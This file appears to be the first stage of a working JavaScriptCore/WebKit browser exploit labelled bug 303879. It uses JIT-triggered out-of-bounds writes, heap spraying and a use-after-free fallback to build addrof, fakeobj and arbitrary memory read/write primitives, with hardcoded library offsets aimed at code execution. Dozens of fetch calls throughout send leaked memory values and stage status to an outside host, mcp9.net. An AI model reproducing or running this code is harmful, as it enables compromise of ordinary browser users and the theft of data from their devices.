
"use strict";
(function () {

  
  
  

  let victim = null;   
  let oob_write_arr = new Array(8).fill(13.37);

  
  function jit_inbounds(idx, val) {
    victim[idx] = val;
    return victim[idx];
  }

  function warmup() {
    for (let i = 0; i < 20000; i++) {
      jit_inbounds(i & 0x7F, 13.37);   
    }
  }

  function triggerOOB() {
    
    for (let idx = 100; idx < 128; idx++) {
      jit_inbounds(idx);
    }
  }

  
  function oobReadProbe() {
    try {
      let reads = [];
      for (let idx = 100; idx < 128; idx++) {
        try {
          let v = victim[idx];
          reads.push(idx + ':' + (typeof v) + ':' + String(v).slice(0, 12));
        } catch(e) {
          reads.push(idx + ':ERR');
        }
      }
      try { fetch('https://mcp9.net/exploit_result?status=pv_oobread&stage=WK&detail=' + encodeURIComponent(reads.slice(0, 10).join('|'))); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_oobread&stage=WK&detail=' + encodeURIComponent('err:' + String((e && e.message) || e).slice(0, 60))); } catch(_) {}
    }
  }
  function oobMarkerProbe() {
    try {
      
      for (let idx = 100; idx < 128; idx++) {
        let mark = 7.0 + idx / 100.0;
        try { jit_inbounds(idx, mark); } catch(e) {}
      }
      
      let hits = [];
      for (let i = 0; i < sprayed.length && i < 8; i++) {
        let arr = sprayed[i];
        if (!arr) continue;
        try {
          if (arr.length !== 100) {
            hits.push('LEN' + i + '=' + arr.length);
          }
          for (let j = 0; j < 100; j++) {
            let v = arr[j];
            if (v !== 0.5) {
              hits.push('arr' + i + '[' + j + ']=' + String(v).slice(0, 16));
              break;
            }
          }
        } catch(e) {}
      }
      
      let vlen = '?';
      try { vlen = victim.length; } catch(e) {}
      try { fetch('https://mcp9.net/exploit_result?status=pv_marker&stage=WK&detail=' + encodeURIComponent('vlen=' + vlen + ' | ' + (hits.slice(0, 8).join('|') || 'no_hits'))); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_marker&stage=WK&detail=' + encodeURIComponent('err:' + String((e && e.message) || e).slice(0, 60))); } catch(_) {}
    }
  }

  function checkSprayCorruption() {
    
    let hits = [];
    try {
      for (let i = 0; i < sprayed.length; i++) {
        let arr = sprayed[i];
        if (!arr) continue;
        if (arr.length !== 100) {
          hits.push('arr' + i + '.length=' + arr.length);
          continue;
        }
        for (let j = 0; j < 100; j++) {
          if (arr[j] !== 0.5) {
            hits.push('arr' + i + '[' + j + ']=' + String(arr[j]).slice(0, 18));
            break;
          }
        }
      }
    } catch(e) {}
    try { fetch('https://mcp9.net/exploit_result?status=pv_sprayhit&stage=WK&detail=' + encodeURIComponent(hits.slice(0, 10).join('|') || 'no_hits')); } catch(_) {}
    return hits;
  }

  
  
  function oobCapacityProbe() {
    try {
      
      for (let idx = 128; idx < 256; idx++) {
        try { jit_inbounds(idx, 9.0 + (idx - 128) / 100.0); } catch(e) {}
      }
      let vlen2 = '?';
      try { vlen2 = victim.length; } catch(e) {}
      let hits = [];
      for (let i = 0; i < sprayed.length && i < 16; i++) {
        let arr = sprayed[i];
        if (!arr) continue;
        try {
          if (arr.length !== 100) hits.push('LEN' + i + '=' + arr.length);
          for (let j = 0; j < 100; j++) {
            let v = arr[j];
            if (v !== 0.5 && v > 8.9 && v < 10.5) {
              hits.push('arr' + i + '[' + j + ']=' + v.toFixed(2));
              break;
            }
          }
        } catch(e) {}
      }
      try { fetch('https://mcp9.net/exploit_result?status=pv_capoob&stage=WK&detail=' + encodeURIComponent('vlen2=' + vlen2 + ' | ' + (hits.slice(0, 8).join('|') || 'no_hits'))); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_capoob&stage=WK&detail=' + encodeURIComponent('err:' + String((e && e.message) || e).slice(0, 60))); } catch(_) {}
    }
  }

  function oobProbe() {
    
    
    let out = [];
    try {
      for (let idx = 3; idx < 48; idx++) {
        let v = victim[idx];   
        if (typeof v === 'number') {
          
          let buf = new ArrayBuffer(8);
          new DataView(buf).setFloat64(0, v, true);
          let bits = new DataView(buf).getBigUint64(0, true);
          out.push(idx + '=' + bits.toString(16));
        } else {
          out.push(idx + '=' + String(v).slice(0, 20));
        }
      }
    } catch(e) {}
    try { fetch('https://mcp9.net/exploit_result?status=pv_oobprobe&stage=WK&detail=' + encodeURIComponent(out.join('|').slice(0, 500))); } catch(_) {}
    return out;
  }

  
  let sprayed = [];   
  function heapFengShui() {
    
    
    sprayed = [];
    
    for (let i = 0; i < 128; i++) {
      sprayed.push(new Array(100).fill(0.5));   
    }
    
  }

  
  let pair = { contig: null, double: null };
  let p = { addrof: null, fakeobj: null };
  const targetFunc = () => {};

  function dbl2bits(v) {
    let buf = new ArrayBuffer(8);
    new DataView(buf).setFloat64(0, v, true);
    return new DataView(buf).getBigUint64(0, true);
  }

  
  
  
  
  
  function exp_negidx() {
    try {
      let tv = new Array(100).fill(1.1);
      function jit_w(idx, val) { tv[idx] = val; return tv[idx]; }
      for (let i = 0; i < 20000; i++) { jit_w(i & 0x7F, 1.1); }  
      tv.length = 3;   
      let origLen = tv.length;
      
      let bigVal = 0x0000000000004000n;   
      let d = (function(b) { let a = new ArrayBuffer(8); new DataView(a).setBigUint64(0, b, true); return new DataView(a).getFloat64(0, true); })(bigVal);
      try { jit_w(-1, d); } catch(e) {}
      let newLen = tv.length;
      
      try { fetch('https://mcp9.net/exploit_result?status=pv_negidx&stage=WK&detail=' + encodeURIComponent('orig=' + origLen + ' new=' + newLen)); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_negidx&stage=WK&detail=' + encodeURIComponent('err:' + String(e && e.message || e).slice(0,60))); } catch(_) {}
    }
  }

  function exp_objfield() {
    try {
      let holder = { a: 0 };
      function jit_mix(flag) {
        holder.a = flag ? { tag: 13.37 } : 13.37;
        return holder.a;
      }
      for (let i = 0; i < 20000; i++) { jit_mix(i & 1); }
      let r1 = jit_mix(true);   
      let r2 = jit_mix(false);
      
      try { fetch('https://mcp9.net/exploit_result?status=pv_objfield&stage=WK&detail=' + encodeURIComponent('r1=' + (typeof r1) + ' r2=' + (typeof r2))); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_objfield&stage=WK&detail=' + encodeURIComponent('err:' + String(e && e.message || e).slice(0,60))); } catch(_) {}
    }
  }

  function establishPrimitives() {
    
    
    
    

    try { fetch('https://mcp9.net/exploit_result?status=pv_begin&stage=WK'); } catch(_) {}

    
    
    try {
      victim.length = 3;                 
      
      jit_inbounds(5, targetFunc);
      let va = victim[5];
      
      
      
      let f = (b) => { let a = new ArrayBuffer(8); new DataView(a).setBigUint64(0, b, true); return new DataView(a).getFloat64(0, true); };
      let r1 = 'n/a', r2 = 'n/a';
      try {
        jit_inbounds(6, f(0xFFFE000000000000n | 0x0443da0n));  r1 = (typeof victim[6]) + ':' + String(victim[6]).slice(0, 50);
      } catch(e) { r1 = 'CRASH:' + String(e && e.message || e).slice(0, 40); }
      try {
        jit_inbounds(7, f(0xFFFE000000000000n | 0n));  r2 = (typeof victim[7]) + ':' + String(victim[7]).slice(0, 50);
      } catch(e) { r2 = 'CRASH:' + String(e && e.message || e).slice(0, 40); }
      try { fetch('https://mcp9.net/exploit_result?status=pv_fakeobj_v4&stage=WK&detail=' + encodeURIComponent('comp32=' + r1 + ' | zero=' + r2)); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_fakeobj_v2&stage=WK&detail=' + encodeURIComponent('err:' + String(e && e.message || e).slice(0,80))); } catch(_) {}
    }

    let contig = [{}, {}, {}, {}];        
    let dbl = [1.1, 2.2, 3.3, 4.4];       

    
    
    
    pair.contig = contig;
    pair.double = dbl;

    
    
    
    
    
    try {
      
      
      pair.contig[0] = targetFunc;
      let probe = pair.double[0];
      let probeIsReal = (typeof probe === 'number') && !(probe === 1.1 || probe === 13.37) && !isNaN(probe);
      try { fetch('https://mcp9.net/exploit_result?status=pv_probe&stage=WK&detail=' + encodeURIComponent('probe=' + String(probe) + ' real=' + probeIsReal)); } catch(_) {}
    } catch(e) {}

    p.addrof = function(o) {
      try {
        victim.length = 3;              
        jit_inbounds(5, o);             
        return dbl2bits(victim[5]);     
      } catch(e) { return 0n; }
    };
    p.fakeobj = function(addr) {
      pair.double[0] = addr;
      return pair.contig[0];      
    };
    
    
    
    let scribbleUpgraded = false;
    try {
      const b64s = (b) => { const ab = new ArrayBuffer(8); const dv = new DataView(ab); dv.setBigUint64(0, b, true); return dv.getFloat64(0, true); };
      const f2b = (x) => { const ab = new ArrayBuffer(8); const dv = new DataView(ab); dv.setFloat64(0, x, true); return dv.getBigUint64(0, true); };
      let junk0 = new Array(4).fill(1.1);
      junk0[0] = 1.1; junk0[1] = 1.1;
      let scribble_element = new Array(4).fill(1.1);
      scribble_element[0] = 1.1; scribble_element[1] = 1.1;
      let results = new Array(2).fill(1.1);
      results[0] = 1.1; results[1] = 1.1;
      let change_scribble_holder = { p1: p.fakeobj(0x0108240700006000n), p2: scribble_element };
      let change_scribble = p.fakeobj(p.addrof(change_scribble_holder) + 0x10n);
      for (let i = 0; i < 2; i++) {
        let a = (i === 0) ? change_scribble : junk0;
        results[i] = a[0];
      }
      change_scribble_holder.p1 = results[0];   
      scribble_element.p3 = 1.1;
      scribble_element[0] = 1.1;
      let double_array_cell = f2b(change_scribble[0]);
      change_scribble_holder.p1 = p.fakeobj(double_array_cell);
      const original_cell = change_scribble[0];
      
      let read64_biguint64arr = new BigUint64Array(4);
      change_scribble[1] = b64s(p.addrof(read64_biguint64arr) + 8n);
      let read64_float64arr_bytes = f2b(scribble_element[1]);
      read64_biguint64arr[0] = 0x10000000006n;
      read64_biguint64arr[1] = read64_float64arr_bytes + 0x10n;
      let read64_str = '\u4444'.repeat(0x10);
      [][read64_str];
      change_scribble[1] = b64s(p.addrof(read64_str) + 8n);
      scribble_element[0] = b64s(read64_float64arr_bytes);
      p.read64 = function(addr) {
        read64_biguint64arr[1] = addr;
        return (BigInt(read64_str.charCodeAt(0))
          | BigInt(read64_str.charCodeAt(1)) << 16n
          | BigInt(read64_str.charCodeAt(2)) << 32n
          | BigInt(read64_str.charCodeAt(3)) << 48n);
      };
      p.read32 = function(addr) {
        read64_biguint64arr[1] = addr;
        return (BigInt(read64_str.charCodeAt(0))
          | BigInt(read64_str.charCodeAt(1)) << 16n);
      };
      p.write64 = function(addr, value) {
        change_scribble[0] = original_cell;
        change_scribble[1] = b64s(addr + 0x10n);
        if (value === 0n) {
          scribble_element.p3 = 1;
          delete scribble_element.p3;
        } else if (value < 0x2000000000000n) {
          scribble_element.p3 = p.fakeobj(value);
        } else if (value <= 0x7ff2000000000000n || (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
          scribble_element.p3 = b64s(value - 0x2000000000000n);
        } else {
          let off_addr = addr + 8n;
          let off_val = p.read64(off_addr);
          let hi = Number(value >> 32n);
          let lo = Number(value & 0xFFFFFFFFn);
          scribble_element.p3 = hi;
          change_scribble[1] = b64s(addr + 0x14n);
          scribble_element.p3 = lo;
          p.write64(off_addr, off_val);
        }
      };
      scribbleUpgraded = true;
      try { fetch('https://mcp9.net/exploit_result?status=pv_scribble_upgraded&stage=WK&detail=backing_store_redirect_ok'); } catch(_) {}
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=pv_scribble_failed&stage=WK&detail=' + encodeURIComponent(String((e && e.message) || e).slice(0,60))); } catch(_) {}
    }
    if (!scribbleUpgraded) {
      p.read64 = function(addr) {
        let fake = p.fakeobj(addr);
        return p.addrof(fake);
      };
      p.write64 = function(addr, val) {
        let fake = p.fakeobj(addr);
        pair.double[0] = val;
        pair.contig[0] = fake;
      };
    }

    
    let v = 0n;
    try { v = p.addrof(targetFunc); } catch(e) {}
    let valid = (typeof v === 'bigint') && v !== 0n && (v >> 48n) !== 0n && v !== 0x402abd70a3d70a3dn;
    try { fetch('https://mcp9.net/exploit_result?status=pv_result&stage=WK&detail=' + encodeURIComponent('addrof=0x' + v.toString(16) + ' valid=' + valid)); } catch(_) {}
    return valid;
  }

  
  const LFH_treetab = new Uint32Array([
    0x26258, 0x12084, 0xa8080, 0x22488, 0x49058, 0x410a1, 0x15099, 0x9a614,
    0x84160, 0x95095, 0x44664, 0x5a506, 0x50889, 0x4a488, 0x60694, 0x4a488
  ]);
  let LFH_grbase = 0;
  let LFH_pair = { contig: false, double: false };

  function LFH_opt(flat) {
    let oj = { a: 0, b: 0, 0: 13.37 };
    let _a = { a: 0 };
    for (let i = 0; i < flat.length; i++) {
      flat[i][2] = oj;
    }
    _a.a = oj;
    oj = 0;
    return _a;
  }
  function LFH_build_tree(depth, isz) {
    if (!depth) return { a: 0 };
    let leaf = new Array(3);
    for (let i = 0; i < 3; i++) {
      leaf[i] = LFH_build_tree(depth - 1, (i === 0) && isz);
    }
    return leaf;
  }
  function LFH_flatten_tree(tree) {
    let flattree = new Array(LFH_treetab.length);
    for (let k in LFH_treetab) {
      let path = LFH_treetab[k];
      let node = tree;
      for (let i = 0; i < 11; i++) {
        node = node[(path >> (i * 2)) & 0x3];
      }
      flattree[k] = node;
    }
    tree[0][0][0][0][0][0][0][0][0][0][0][0][0] = flattree;
  }
  function LFH_wipe_tree(tree) {
    if (tree.a !== undefined) return;
    if (!tree) return;
    for (let i = 2; i >= 0; i--) {
      let v = tree[i];
      tree[i] = 0;
      LFH_wipe_tree(v);
    }
  }
  function LFH_gr(a) {
    try { return new Uint8Array(2 << (LFH_grbase + a)); } catch (e) { return null; }
  }

  function LFH_pwn() {
    const iit = 256;
    let rpl = new Array(4096);
    let rpl2 = new Array(4096);
    let uaf = new Array(0);
    let tree = LFH_build_tree(12, 3);
    LFH_flatten_tree(tree);
    for (let i = 0; i < 16; i++) {
      rpl[i] = new Array(14.47, 14.47, 14.47, i);
    }
    LFH_gr(5);
    let flattree = tree[0][0][0][0][0][0][0][0][0][0][0][0][0];
    for (let i = 0; i < iit; i++) {
      uaf[i] = LFH_opt(flattree);
    }
    flattree.length = 0;
    LFH_wipe_tree(tree);
    LFH_gr(5);
    LFH_gr(5);
    for (let i = 0; i < iit * 2; i++) {
      rpl2[i] = new Array(14.47, 14.47, 14.47, i);
    }
    for (let i = 0; i < iit; i++) {
      uaf[i] = uaf[i].a;
    }
    LFH_gr(5);
    for (let i = 0; i < iit; i++) {
      rpl[i] = { a: 4242, b: i };
    }
    let found = false;
    for (let i = 0; i < iit; i++) {
      if (!found && uaf[i][0] == 14.47) {
        uaf[i][0] = 15.57;
        for (let j = 0; j < rpl2.length; j++) {
          if (rpl2[j] && rpl2[j][0] == 15.57) {
            rpl2[j][0] = new Array(0);
            LFH_pair.contig = rpl2[j];
            LFH_pair.double = uaf[i];
            rpl2.fill(0);
            uaf.fill(0);
            LFH_gr(6);
            LFH_gr(6);
            return true;
          }
        }
      }
      uaf[i][0] = 0;
    }
    rpl.fill(0);
    rpl2.fill(0);
    LFH_gr(5);
    return false;
  }

  function establishPrimitives_v2_loadfromhole() {
    try {
      let shallow_flat = new Array(new Array(false, false), new Array(false, false));
      for (let i = 0; i < 25000; ++i) {
        shallow_flat[0][0] = i;
        shallow_flat[1][0] = i;
        LFH_opt(shallow_flat);
      }
      for (let attempt = 0; attempt < 8; attempt++) {
        let ok = false;
        try { ok = LFH_pwn(); } catch (e) {
          try { fetch('https://mcp9.net/exploit_result?status=lfh_err&stage=WK&detail=' + encodeURIComponent('att' + attempt + ':' + String((e && e.message) || e).slice(0, 60))); } catch(_) {}
          continue;
        }
        if (!ok) {
          if (attempt === 7) {
            try { fetch('https://mcp9.net/exploit_result?status=lfh_pwn_failed&stage=WK&detail=' + encodeURIComponent('8 attempts no pair')); } catch(_) {}
          }
          continue;
        }
        
        try {
          const buf = new ArrayBuffer(16);
          const u64 = new BigUint64Array(buf);
          const f64 = new Float64Array(buf);
          const before = (f64[0] = LFH_pair.double[0], u64[0]);
          LFH_pair.contig[0] = { marker: 0x41424344 };
          const after = (f64[0] = LFH_pair.double[0], u64[0]);
          LFH_pair.double[0] = 13.37;
          if (before !== after) {
            p.addrof = function(o) {
              LFH_pair.contig[0] = o;
              f64[0] = LFH_pair.double[0];
              let rv = u64[0];
              LFH_pair.double[0] = 13.37;
              return rv;
            };
            p.fakeobj = function(addr) {
              u64[0] = addr;
              LFH_pair.double[0] = f64[0];
              let rv = LFH_pair.contig[0];
              LFH_pair.double[0] = 13.37;
              return rv;
            };
            p.read64 = function(addr) {
              let fake = p.fakeobj(addr);
              return p.addrof(fake);
            };
            p.write64 = function(addr, val) {
              let fake = p.fakeobj(addr);
              LFH_pair.double[0] = val;
              LFH_pair.contig[0] = fake;
            };
            try { fetch('https://mcp9.net/exploit_result?status=lfh_pair_ok&stage=WK&detail=' + encodeURIComponent('att' + attempt + ' before=0x' + before.toString(16) + ' after=0x' + after.toString(16))); } catch(_) {}
            return true;
          }
          try { fetch('https://mcp9.net/exploit_result?status=lfh_pair_confusion_failed&stage=WK&detail=' + encodeURIComponent('att' + attempt)); } catch(_) {}
        } catch (e) {
          try { fetch('https://mcp9.net/exploit_result?status=lfh_verify_err&stage=WK&detail=' + encodeURIComponent(String((e && e.message) || e).slice(0, 60))); } catch(_) {}
        }
      }
    } catch (e) {
      try { fetch('https://mcp9.net/exploit_result?status=lfh_outer_err&stage=WK&detail=' + encodeURIComponent(String((e && e.message) || e).slice(0, 60))); } catch(_) {}
    }
    return false;
  }

  
  const OFF = {
    jsc_base: 0x198ce6000n,        
    jitCagePtr: 0x1efc80fd0n  ,      
    globalFuncParseFloat: 0x199e5d9fcn, 
    B3_reduceStrength: 0x199323b78n  ,    
    dlopen: 0x18014d000n,          
    dlsym: 0x18014e000n,           
  };

  
  function triggerStage1() {
    exp_negidx();
    exp_objfield();
    
    
    victim = new Array(100).fill({x: 1});      
    sprayed = [new Array(100).fill(0.5)];      
    for (let i = 1; i < 128; i++) {
      sprayed.push(new Array(100).fill(0.5));
    }
    warmup();                                   
    triggerOOB();                               
    oobMarkerProbe();                           
    oobReadProbe();                             
    oobCapacityProbe();                         
    checkSprayCorruption();
    oobProbe();
    const ok = establishPrimitives();
    
    
    let firstLayerReal = false;
    if (ok) {
      try {
        const tv = p.addrof({ marker: 303879 });
        const dom = tv >> 48n;
        firstLayerReal = (typeof tv === 'bigint') && tv !== 0n &&
          (dom === 0x1an || dom === 0x1en || dom === 0x1n || dom === 0xfffen);
        try { fetch('https://mcp9.net/exploit_result?status=pv_layer1_check&stage=WK&detail=' + encodeURIComponent('addrof=0x' + tv.toString(16) + ' dom=' + dom.toString(16) + ' real=' + firstLayerReal)); } catch(_) {}
      } catch(e) {}
    }
    if (ok && firstLayerReal) {
      globalThis.__p_rce = p;
      return { ok: true, bug: '303879', method: 'InBounds-OOB-write' };
    }
    
    try {
      if (establishPrimitives_v2_loadfromhole()) {
        globalThis.__p_rce = p;
        return { ok: true, bug: '303879', method: 'LoadFromHole-opt-pair' };
      }
    } catch(e) {
      try { fetch('https://mcp9.net/exploit_result?status=lfh_stage_err&stage=WK&detail=' + encodeURIComponent(String((e && e.message) || e).slice(0, 60))); } catch(_) {}
    }
    return { ok: false, bug: '303879', reason: 'oob_primitive_failed' };
  }

  window.__stage1_bug303879 = {
    triggerStage1, warmup, triggerOOB, heapFengShui, establishPrimitives,
    establishPrimitives_v2_loadfromhole, LFH_pwn,
    offsets: OFF, version: '26.5-bug303879-lfh',
    bug: '303879', bugType: 'InBounds out-of-bounds write',
  };
})();
